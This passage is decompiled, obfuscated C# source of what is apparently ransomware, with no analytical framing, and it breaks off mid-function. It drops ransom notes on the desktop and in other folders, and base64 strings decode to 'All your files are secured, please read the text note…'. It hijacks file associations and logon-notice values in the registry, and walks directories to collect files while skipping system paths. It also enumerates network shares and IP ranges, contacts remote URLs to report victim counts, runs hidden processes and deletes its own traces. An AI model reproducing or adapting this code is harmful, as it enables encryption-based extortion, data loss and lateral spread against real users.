				getString_0(107396010),
				getString_0(107396213),
				getString_0(107396005),
				getString_0(107396171),
				getString_0(107395996),
				getString_0(107396023),
				getString_0(107396018),
				getString_0(107396013),
				getString_0(107395976),
				getString_0(107395971),
				getString_0(107395966),
				getString_0(107395993),
				getString_0(107395988),
				getString_0(107395983),
				getString_0(107395434),
				getString_0(107395429),
				getString_0(107395424),
				getString_0(107395451),
				getString_0(107395446),
				getString_0(107395441),
				getString_0(107395436),
				getString_0(107395395),
				getString_0(107395390),
				getString_0(107395413),
				getString_0(107395368),
				getString_0(107396005),
				getString_0(107395387),
				getString_0(107395378),
				getString_0(107395337),
				getString_0(107395328),
				getString_0(107395351),
				getString_0(107395342),
				getString_0(107395305),
				getString_0(107395296),
				getString_0(107395319),
				getString_0(107395310),
				getString_0(107395273),
				getString_0(107395268),
				getString_0(107395263),
				getString_0(107395290),
				getString_0(107395285),
				getString_0(107395280),
				getString_0(107395239),
				getString_0(107395234),
				getString_0(107395229),
				getString_0(107395256),
				getString_0(107395251),
				getString_0(107395246),
				getString_0(107395205),
				getString_0(107395196),
				getString_0(107395223),
				getString_0(107396039),
				getString_0(107395218),
				getString_0(107395213),
				getString_0(107395688),
				getString_0(107395683),
				getString_0(107395678),
				getString_0(107395701),
				getString_0(107395696),
				getString_0(107395659),
				getString_0(107395650),
				getString_0(107395645),
				getString_0(107395672)
			}, new string[0], ptbrIyAxDBqTL, getString_0(107395667));
		}
		catch (Exception ex6)
		{
			if (IxPlnZLdvsZB)
			{
				try
				{
					File.AppendAllText(AJzDKHoaGNRf, getString_0(107395626) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		if (!zmkyOqtOWhAMq || lbKtRvXlZTmt)
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395633)))
				{
					using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395633));
					streamWriter.WriteLine(EvKBdYIakj(getString_0(107395600)).Replace(getString_0(107390338), hdkhpYUKtylncPr.GNhfBZvUwCJTZVIF()).Replace(getString_0(107390361), Environment.UserName).Replace(getString_0(107389800), Environment.MachineName)
						.Replace(getString_0(107389811), Environment.UserDomainName));
					streamWriter.WriteLine(getString_0(107396488));
					if (DOtLkCUQkgViIsPR || !YrjqOIvQHnLHl)
					{
						streamWriter.WriteLine(EvKBdYIakj(getString_0(107389762)));
						streamWriter.WriteLine(CcZHpsCIoJG);
					}
					if (dWQLbOGxxGUm == getString_0(107396466))
					{
						streamWriter.WriteLine(getString_0(107396488));
						streamWriter.WriteLine(EvKBdYIakj(getString_0(107389777)) + Convert.ToString(mOohEoBvvwIsCph.Count));
					}
					if (ftECRArlHKepq)
					{
						streamWriter.WriteLine(getString_0(107396488));
						streamWriter.WriteLine(EvKBdYIakj(getString_0(107389668)));
						streamWriter.WriteLine(hdkhpYUKtylncPr.GNhfBZvUwCJTZVIF());
					}
				}
				else
				{
					string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395633));
					if (!text7.Contains(CcZHpsCIoJG) && !YrjqOIvQHnLHl)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395633), getString_0(107389635) + CcZHpsCIoJG);
					}
				}
			}
			catch (Exception ex6)
			{
				if (IxPlnZLdvsZB)
				{
					try
					{
						File.AppendAllText(AJzDKHoaGNRf, getString_0(107389606) + ex6.Message + getString_0(107396488));
					}
					catch (Exception)
					{
					}
				}
			}
			int num = 0;
			foreach (string item in AVcTEbDnEiIrK)
			{
				num++;
				try
				{
					if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
					{
						continue;
					}
				}
				catch
				{
				}
				try
				{
					if (!File.Exists(item + getString_0(107395633)))
					{
						File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395633), item + getString_0(107395633), overwrite: true);
					}
					else
					{
						string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395633));
						if (!text7.Contains(CcZHpsCIoJG) && !YrjqOIvQHnLHl)
						{
							File.AppendAllText(item + getString_0(107395633), getString_0(107389635) + CcZHpsCIoJG);
						}
					}
				}
				catch (Exception ex6)
				{
					if (IxPlnZLdvsZB)
					{
						try
						{
							File.AppendAllText(AJzDKHoaGNRf, getString_0(107389606) + ex6.Message + getString_0(107396488));
						}
						catch (Exception)
						{
						}
					}
					num--;
				}
				if (!ugqwmwtvqbFo && num > 10)
				{
					break;
				}
			}
		}
		QXeYUTtxJtu();
		if ((SnXfyvTxvoJ == getString_0(107396968) && !zmkyOqtOWhAMq) || (SnXfyvTxvoJ == getString_0(107396968) && lbKtRvXlZTmt))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389593)))
				{
					using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389593));
					streamWriter.WriteLine(EvKBdYIakj(getString_0(107390072)).Replace(getString_0(107390338), hdkhpYUKtylncPr.GNhfBZvUwCJTZVIF()).Replace(getString_0(107390361), Environment.UserName).Replace(getString_0(107389800), Environment.MachineName)
						.Replace(getString_0(107389811), Environment.UserDomainName));
					streamWriter.WriteLine(getString_0(107396488));
					if (DOtLkCUQkgViIsPR || !YrjqOIvQHnLHl)
					{
						streamWriter.WriteLine(EvKBdYIakj(PbjDJjWZgFBdj(getString_0(107390023))));
						streamWriter.WriteLine(CcZHpsCIoJG + EvKBdYIakj(getString_0(107389950)));
					}
					if (dWQLbOGxxGUm == getString_0(107396466))
					{
						streamWriter.WriteLine(getString_0(107396488));
						streamWriter.WriteLine(EvKBdYIakj(getString_0(107389969)) + EvKBdYIakj(getString_0(107389777)) + Convert.ToString(mOohEoBvvwIsCph.Count) + EvKBdYIakj(getString_0(107389950)));
					}
					if (ftECRArlHKepq)
					{
						streamWriter.WriteLine(getString_0(107396488));
						streamWriter.WriteLine(EvKBdYIakj(getString_0(107389668)));
						streamWriter.WriteLine(hdkhpYUKtylncPr.GNhfBZvUwCJTZVIF());
					}
				}
				else
				{
					string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395633));
					if (!text7.Contains(CcZHpsCIoJG) && !YrjqOIvQHnLHl)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389593), EvKBdYIakj(getString_0(107389969)) + getString_0(107389635) + CcZHpsCIoJG + EvKBdYIakj(getString_0(107389950)));
					}
				}
			}
			catch (Exception ex6)
			{
				if (IxPlnZLdvsZB)
				{
					try
					{
						File.AppendAllText(AJzDKHoaGNRf, getString_0(107389908) + ex6.Message + getString_0(107396488));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (NqxhHNylXDzJMss == getString_0(107396968))
		{
			try
			{
				if (dWQLbOGxxGUm == getString_0(107396466))
				{
					hdkhpYUKtylncPr.MLkepTeFGkIBE(getString_0(107389851), getString_0(107389846), getString_0(107389289), string.Concat(EvKBdYIakj(getString_0(107396554)), new WebClient().DownloadString(EvKBdYIakj(getString_0(107396561))), getString_0(107389280), EvKBdYIakj(getString_0(107396483)), DateTime.Now, getString_0(107396488), EvKBdYIakj(getString_0(107389307)), Convert.ToString(mOohEoBvvwIsCph.Count), getString_0(107396488), EvKBdYIakj(getString_0(107395962)), CcZHpsCIoJG));
				}
				else
				{
					hdkhpYUKtylncPr.MLkepTeFGkIBE(getString_0(107389851), getString_0(107389846), getString_0(107389289), string.Concat(EvKBdYIakj(getString_0(107396554)), new WebClient().DownloadString(EvKBdYIakj(getString_0(107396561))), getString_0(107389280), EvKBdYIakj(getString_0(107396483)), DateTime.Now, getString_0(107396488), EvKBdYIakj(getString_0(107389307)), Convert.ToString(mOohEoBvvwIsCph.Count), getString_0(107396488), EvKBdYIakj(getString_0(107395962)), CcZHpsCIoJG));
				}
			}
			catch
			{
			}
		}
		if (OMtKsvaQdirySzwjg == getString_0(107396968))
		{
			try
			{
				IrPdZxAbQHjM.kikdnjKjsDFpv(new Uri(getString_0(107389226)));
			}
			catch
			{
			}
		}
		if (SnXfyvTxvoJ == getString_0(107396466) && !zmkyOqtOWhAMq)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395633)))
				{
					Process.Start(EvKBdYIakj(getString_0(107389225)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395633));
				}
				try
				{
					if (DHKhstFrxWX)
					{
						Console.WriteLine(getString_0(107389232));
					}
				}
				catch
				{
				}
			}
			catch (Exception ex6)
			{
				if (IxPlnZLdvsZB)
				{
					try
					{
						File.AppendAllText(AJzDKHoaGNRf, getString_0(107389203) + ex6.Message + getString_0(107396488));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		else if (SnXfyvTxvoJ == getString_0(107396968) && !zmkyOqtOWhAMq)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389593)))
				{
					Process.Start(EvKBdYIakj(getString_0(107389118)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389593));
				}
				try
				{
					if (DHKhstFrxWX)
					{
						Console.WriteLine(getString_0(107389133));
					}
				}
				catch
				{
				}
			}
			catch (Exception ex6)
			{
				if (IxPlnZLdvsZB)
				{
					try
					{
						File.AppendAllText(AJzDKHoaGNRf, getString_0(107389104) + ex6.Message + getString_0(107396488));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (JWeCzmkXGapsEO == getString_0(107396968))
		{
			if (cHlMXqrlaqguL == getString_0(107396968) && !string.IsNullOrEmpty(mSrKrgVcQPqlFZ) && !string.IsNullOrEmpty(JlvCoFbKLcBH))
			{
				qYxbJNKFOOVOI(mSrKrgVcQPqlFZ, JlvCoFbKLcBH);
			}
			else
			{
				qYxbJNKFOOVOI(getString_0(107389563), getString_0(107389502));
			}
		}
		if (JdraEdbLNwPZxsL != getString_0(107389388))
		{
			VUmQPQMBvQY(JdraEdbLNwPZxsL);
		}
		if (!string.IsNullOrEmpty(EpCsDxtJYsZGzw))
		{
			try
			{
				File.Delete(EpCsDxtJYsZGzw);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397139))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397139)));
			}
		}
		catch (Exception ex12)
		{
			try
			{
				File.AppendAllText(AJzDKHoaGNRf, getString_0(107389371) + ex12.Message);
			}
			catch (Exception)
			{
			}
		}
		if (IxPlnZLdvsZB)
		{
			try
			{
				File.AppendAllText(AJzDKHoaGNRf, getString_0(107389326));
			}
			catch (Exception)
			{
			}
		}
		stopwatch.Stop();
		TimeSpan elapsed = stopwatch.Elapsed;
		string contents = string.Format(getString_0(107388769), elapsed.Hours, elapsed.Minutes, elapsed.Seconds, elapsed.Milliseconds / 10);
		if (IxPlnZLdvsZB)
		{
			try
			{
				File.AppendAllText(AJzDKHoaGNRf, contents);
			}
			catch (Exception)
			{
			}
		}
		if (XQBvVaBiYNtbTGQ == getString_0(107388708))
		{
			VActiygTXQaRxCgZR();
		}
	}

	[DllImport("Shell32.dll")]
	private static extern int SHChangeNotify(int int_0, int int_1, IntPtr intptr_0, IntPtr intptr_1);

	public static bool KfLMJcnqEVk(string string_0, string string_1, string string_2, string string_3, string string_4)
	{
		return false | yfkkYSwmMyzRjD(EvKBdYIakj(getString_0(107388731)) + string_0, string_1) | yfkkYSwmMyzRjD(EvKBdYIakj(getString_0(107388731)) + string_1, string_2) | yfkkYSwmMyzRjD(EvKBdYIakj(getString_0(107388731)) + string_1 + EvKBdYIakj(getString_0(107388698)), getString_0(107388657) + string_3 + getString_0(107388652) + string_4 + getString_0(107388657));
	}

	private static bool yfkkYSwmMyzRjD(string string_0, string string_1)
	{
		using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(string_0))
		{
			if (registryKey.GetValue(null) as string!= string_1)
			{
				registryKey.SetValue(null, string_1);
				return true;
			}
		}
		return false;
	}

	public static void QXeYUTtxJtu()
	{
		try
		{
			if (!ftzzNtuKSF)
			{
				if (KfLMJcnqEVk(getString_0(107395667), EvKBdYIakj(getString_0(107388615)), EvKBdYIakj(getString_0(107388630)), EvKBdYIakj(getString_0(107388589)), Path.GetTempPath() + getString_0(107389040)))
				{
					SHChangeNotify(134217728, 4096, IntPtr.Zero, IntPtr.Zero);
				}
			}
			else if (KfLMJcnqEVk(getString_0(107395667), EvKBdYIakj(getString_0(107389007)), EvKBdYIakj(getString_0(107388962)), EvKBdYIakj(getString_0(107388929)), EvKBdYIakj(getString_0(107388840))))
			{
				SHChangeNotify(134217728, 4096, IntPtr.Zero, IntPtr.Zero);
			}
			try
			{
				if (DHKhstFrxWX)
				{
					Console.WriteLine(getString_0(107388847));
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
			if (IxPlnZLdvsZB)
			{
				try
				{
					File.AppendAllText(AJzDKHoaGNRf, getString_0(107388254));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static void OgMztxkLImS()
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(EvKBdYIakj(PbjDJjWZgFBdj(getString_0(107388241))), EvKBdYIakj(getString_0(107389563)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int bBEUkiWblfEQ(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> CpuiKiVeos(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if ((clyvuVTVcB.Count > 0 && clyvuVTVcB.Contains(text)) || ((text.Contains(getString_0(107388087)) || text.Contains(getString_0(107388030)) || text.Contains(getString_0(107388509)) || text.ToLower().Contains(getString_0(107388524)) || text.ToLower().Contains(getString_0(107388479)) || text.Contains(getString_0(107388454)) || text.Contains(getString_0(107388465)) || text.ToLower().Contains(getString_0(107388420)) || text.ToLower().Contains(getString_0(107388439)) || text.ToLower().Contains(getString_0(107388402)) || text.ToLower().Contains(getString_0(107388361)) || text.ToLower().Contains(getString_0(107388376)) || text.ToLower().Contains(getString_0(107388331)) || text.ToLower().Contains(getString_0(107388318)) || text.ToLower().Contains(getString_0(107388297))) && !text.Contains(EvKBdYIakj(getString_0(107388304)))))
				{
					continue;
				}
				array = Directory.GetFiles(text);
				goto IL_0235;
			}
			catch
			{
			}
			continue;
			IL_0235:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107387719)) && !fileInfo.FullName.Contains(getString_0(107387734)) && !fileInfo.FullName.Contains(getString_0(107387685)) && !fileInfo.FullName.Contains(getString_0(107387700)) && !fileInfo.FullName.Contains(getString_0(107387651)) && !fileInfo.FullName.Contains(getString_0(107387666)) && !fileInfo.FullName.Contains(getString_0(107387617)) && !fileInfo.FullName.Contains(getString_0(107387632)) && !fileInfo.FullName.Contains(getString_0(107387587)) && !fileInfo.FullName.Contains(getString_0(107387598)) && !fileInfo.FullName.ToLower().Contains(getString_0(107387553)) && !fileInfo.FullName.ToLower().Contains(getString_0(107387572)) && !fileInfo.FullName.ToLower().Contains(getString_0(107387523)) && !fileInfo.FullName.ToLower().Contains(getString_0(107387538)) && !fileInfo.FullName.Contains(EvKBdYIakj(getString_0(107388001))) && !fileInfo.FullName.Contains(getString_0(107387976)) && !fileInfo.FullName.Contains(getString_0(107387995)) && !fileInfo.FullName.Contains(getString_0(107397139)) && !fileInfo.FullName.Contains(getString_0(107387982)) && !fileInfo.FullName.EndsWith(getString_0(107395667)) && !fileInfo.FullName.EndsWith(getString_0(107387957)) && !fileInfo.FullName.EndsWith(getString_0(107387952)) && !fileInfo.FullName.EndsWith(getString_0(107387915)) && !fileInfo.FullName.EndsWith(getString_0(107387910)) && !fileInfo.FullName.Contains(getString_0(107387905)) && !fileInfo.FullName.Contains(dkWBHAPryK) && !fileInfo.FullName.Contains(AJzDKHoaGNRf) && !fileInfo.FullName.Contains(THXwmzLnrqe))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(bpXPuDgesBNQk) * 1024.0 * 1024.0 && eaVwpFidBvEVE == getString_0(107396968))
						{
							list.Add(fileInfo.FullName);
							guEEvfWUmowpr(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && eaVwpFidBvEVE == getString_0(107396466))
						{
							list.Add(fileInfo.FullName);
							guEEvfWUmowpr(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			array2 = directories;
			foreach (string item in array2)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void IocdDhlhIU()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107387920));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!ErNGCzDqbgJcNq.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387867), getString_0(107396890)).Replace(getString_0(107387862), getString_0(107387867))
					.Replace(getString_0(107388657), getString_0(107389226))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					ErNGCzDqbgJcNq.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387867), getString_0(107396890)).Replace(getString_0(107387862), getString_0(107387867))
						.Replace(getString_0(107388657), getString_0(107389226))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107387853), getString_0(107389226)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string QKkRdHWXNelGs(string VykmEbnqdIrGSwV = "", string FSDuzwFpjtenQbD = "")
	{
		string result = getString_0(107389226);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = VykmEbnqdIrGSwV,
				Arguments = FSDuzwFpjtenQbD,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
		}
		catch
		{
		}
		return result;
	}

	public static void seeqzwHruqoL(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107387812),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string PbjDJjWZgFBdj(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string EvKBdYIakj(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void hMaPvnEMjnu(string DyNXNrcrQF = "", string vRlteKxVQUguXh = "SW5mb3JtYXRpb24uLi4=", string NlebboeRBQAA = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
	{
		DyNXNrcrQF = PbjDJjWZgFBdj(getString_0(107387827));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(EvKBdYIakj(DyNXNrcrQF), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(EvKBdYIakj(getString_0(107387218)), EvKBdYIakj(vRlteKxVQUguXh));
				registryKey.SetValue(EvKBdYIakj(getString_0(107387185)), EvKBdYIakj(NlebboeRBQAA));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			DyNXNrcrQF = PbjDJjWZgFBdj(getString_0(107387156));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(EvKBdYIakj(DyNXNrcrQF), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(EvKBdYIakj(getString_0(107387019)), EvKBdYIakj(vRlteKxVQUguXh));
				registryKey.SetValue(EvKBdYIakj(getString_0(107387498)), EvKBdYIakj(NlebboeRBQAA));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void ZOXXLkeBEtSTsEu()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (cHlMXqrlaqguL == getString_0(107396968) && !string.IsNullOrEmpty(mSrKrgVcQPqlFZ) && !string.IsNullOrEmpty(JlvCoFbKLcBH))
				{
					hMaPvnEMjnu(getString_0(107389226), mSrKrgVcQPqlFZ, JlvCoFbKLcBH);
				}
				else
				{
					hMaPvnEMjnu(getString_0(107389226), getString_0(107389563), getString_0(107389502));
				}
			}
		}
		catch
		{
		}
	}

	public static void qYxbJNKFOOVOI(string LdSyfpAmaejwsh = "SW5mb3JtYXRpb24uLi4=", string EWOUiHCnqekwTxkd = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(EvKBdYIakj(LdSyfpAmaejwsh));
		val.set_BalloonTipText(EvKBdYIakj(EWOUiHCnqekwTxkd));
		val.ShowBalloonTip(30000);
	}

	public static void VUmQPQMBvQY(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		QKkRdHWXNelGs(EvKBdYIakj(getString_0(107387501)), getString_0(107387452) + text + getString_0(107387475) + string_0);
	}

	private static void IRmkEZyqQsswghf()
	{
		//IL_0275: Unknown result type (might be due to invalid IL or missing references)
		//IL_027c: Expected O, but got Unknown
		//IL_029e: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a5: Expected O, but got Unknown
		BiVWcARNBVibS();
		List<OjnisleDhCtqP> list = OjnisleDhCtqP.XRIvuWSIGVLO();
		foreach (OjnisleDhCtqP item in list)
		{
			zwcghQHXyETN.Add(item.IPAddress);
		}
		List<string> source = zwcghQHXyETN;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a = delegate(string string_0)
			{
				DnFyLezoexaawD CS_0024_003C_003E8__locals0 = new DnFyLezoexaawD();
				CS_0024_003C_003E8__locals0.QPiYaXjxNzol = string_0;
				if ((CS_0024_003C_003E8__locals0.QPiYaXjxNzol.StartsWith(getString_0(107385526)) || CS_0024_003C_003E8__locals0.QPiYaXjxNzol.StartsWith(getString_0(107385521)) || CS_0024_003C_003E8__locals0.QPiYaXjxNzol.StartsWith(getString_0(107385480)) || CS_0024_003C_003E8__locals0.QPiYaXjxNzol.StartsWith(getString_0(107389226))) && coBWxmnoGcnU.rMZPfYootxOJU(CS_0024_003C_003E8__locals0.QPiYaXjxNzol))
				{
					try
					{
						Thread.Sleep(MpJOfNTSgoM);
						ErNGCzDqbgJcNq.Add(getString_0(107387867) + CS_0024_003C_003E8__locals0.QPiYaXjxNzol + getString_0(107385499));
						try
						{
							if (DHKhstFrxWX)
							{
								Console.WriteLine(getString_0(107387867) + CS_0024_003C_003E8__locals0.QPiYaXjxNzol + getString_0(107385499));
							}
						}
						catch
						{
						}
						Parallel.For(68, 91, delegate(int int_0)
						{
							Thread.Sleep(MpJOfNTSgoM);
							ErNGCzDqbgJcNq.Add(DnFyLezoexaawD.getString_0(107387873) + CS_0024_003C_003E8__locals0.QPiYaXjxNzol + DnFyLezoexaawD.getString_0(107396896) + (char)int_0 + DnFyLezoexaawD.getString_0(107411747));
							try
							{
								if (DHKhstFrxWX)
								{
									Console.WriteLine(DnFyLezoexaawD.getString_0(107387873) + CS_0024_003C_003E8__locals0.QPiYaXjxNzol + DnFyLezoexaawD.getString_0(107396896) + (char)int_0 + DnFyLezoexaawD.getString_0(107411747));
								}
							}
							catch
							{
							}
						});
					}
					catch
					{
					}
				}
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a);
		try
		{
			coBWxmnoGcnU.CbNJxJXghLZ cbNJxJXghLZ = new coBWxmnoGcnU.CbNJxJXghLZ(coBWxmnoGcnU.hyDrOUCkYT.DLaTJplbZVY, coBWxmnoGcnU.SwfWvSoMYlL.shjjZHmKVFcP, coBWxmnoGcnU.KmJJJvVPCXqCz.JcshpWWwRSD, coBWxmnoGcnU.qdjgOnHQYa.vfvBVtHDXZeZ);
			foreach (string item2 in cbNJxJXghLZ)
			{
				MatchCollection matchCollection = Regex.Matches(item2, getString_0(107387470));
				foreach (Match item3 in matchCollection)
				{
					try
					{
						if (!ErNGCzDqbgJcNq.Contains(item3.ToString()))
						{
							ErNGCzDqbgJcNq.Add(item3.ToString());
						}
					}
					catch
					{
					}
					try
					{
						if (DHKhstFrxWX)
						{
							Console.WriteLine(item3.ToString());
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		SieAsnBExFce.obYdsTprpv();
		try
		{
			if (DHKhstFrxWX)
			{
				Console.WriteLine(getString_0(107387357));
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = PbjDJjWZgFBdj(getString_0(107387156));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(EvKBdYIakj(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(EvKBdYIakj(getString_0(107387348)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(EvKBdYIakj(getString_0(107387291)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (fXpSSYeekBJZJE == getString_0(107396968))
		{
			GlqyOrJeynl.yeMlISZRhWHMLW();
		}
		try
		{
			if (DHKhstFrxWX)
			{
				Console.WriteLine(getString_0(107386734));
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107387920));
		ManagementObjectEnumerator enumerator4 = val.Get().GetEnumerator();
		try
		{
			while (enumerator4.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator4.get_Current();
				if (ErNGCzDqbgJcNq.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387867), getString_0(107396890)).Replace(getString_0(107387862), getString_0(107387867))
					.Replace(getString_0(107388657), getString_0(107389226))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (DHKhstFrxWX)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387867), getString_0(107396890)).Replace(getString_0(107387862), getString_0(107387867))
							.Replace(getString_0(107388657), getString_0(107389226))
							.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107387853), getString_0(107389226)));
					}
				}
				catch
				{
				}
				ErNGCzDqbgJcNq.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387867), getString_0(107396890)).Replace(getString_0(107387862), getString_0(107387867))
					.Replace(getString_0(107388657), getString_0(107389226))
					.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107387853), getString_0(107389226)));
			}
		}
		finally
		{
			((IDisposable)enumerator4)?.Dispose();
		}
		try
		{
			if (DHKhstFrxWX)
			{
				Console.WriteLine(getString_0(107386677));
			}
		}
		catch
		{
		}
	}

	public static bool umEiRysrNTJU()
	{
		WebRequest webRequest = WebRequest.Create(getString_0(107386608));
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void fTntuKaZyTzi(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = EvKBdYIakj(getString_0(107386575));
		processStartInfo.Arguments = getString_0(107386546) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool IUXSYthoJRyA(string string_0, string string_1)
	{
		try
		{
